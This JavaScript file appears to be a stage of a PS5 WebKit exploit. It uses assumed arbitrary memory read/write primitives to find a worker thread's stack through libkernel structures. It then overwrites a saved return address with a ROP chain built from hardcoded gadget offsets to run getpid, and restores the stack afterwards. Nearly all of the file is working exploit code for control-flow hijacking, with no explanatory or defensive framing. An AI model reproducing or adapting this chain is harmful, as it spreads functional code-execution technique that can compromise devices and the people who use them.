// worker_fast_1340.js — [getpid -> store -> infloop], verdict IMMEDIATELY on reply.
// Fire->verdict ~ms: OOM (seconds) cannot explain silence anymore.
(async () => {
  const say = async (s) => { try { await log("[wfast] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  const POISON = 0x00C0FFEDEADBEEFn;
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),5000))]);
  }catch(e){ await say("ABORT handshake"); return; }
  let wstack = 0n;
  for(const h of [0x64218,0x6C218]){
    try{ let t=read64(LK+BigInt(h));
      for(let i=0;i<64&&t!==0n;i++){ if(read64(t+0xB0n)===0x80000n){ wstack=read64(t+0xA8n); break; } t=read64(t+0x38n); }
    }catch(e){}
    if(wstack) break;
  }
  const EXP = LK+0x1FD01n;
  let retslot = 0n, cnt = 0;
  try{ for(let o=0x7F000n;o<0x80000n;o+=8n){ if(read64(wstack+o)===EXP){ cnt++; if(!retslot) retslot=wstack+o; } } }catch(e){}
  if(cnt!==1){ await say("ABORT retfp="+cnt); return; }
  const retval = malloc(8), cbase = malloc(0x1000), entry = cbase+0x100n;
  write64(retval, POISON);
  const Q = [];
  if(entry&8n) Q.push(WK+0xC7n); // 16B-align stub entry (rop.js discipline)
  Q.push(LK+0x1B860n, WK+0x288B2n, retval, WK+0x3881Fn, WK+0x1553Dn);
  for(let i=0;i<Q.length;i++) write64(entry+BigInt(i*8), Q[i]);
  const orig_ret = read64(retslot), orig_sp = read64(retslot+8n);
  write64(retslot, WK+0xA1138n);
  write64(retslot+8n, entry);
  await say("fired");
  worker.onmessage = () => {
    let got = 0n;
    try{ got = read64(retval); }catch(e){}
    const v = got===POISON ? "MISSED (poison)" : ("RAN pid="+got);
    try{ log("[wfast] verdict "+v); }catch(e){}
    try{ send_notification(("wfast "+v).slice(0,120)); }catch(e){}
  };
  worker.postMessage(0);
  await new Promise((r)=>setTimeout(r,2500));
  try{ write64(retslot, orig_ret); write64(retslot+8n, orig_sp); }catch(e){}
  await say("end");
})();
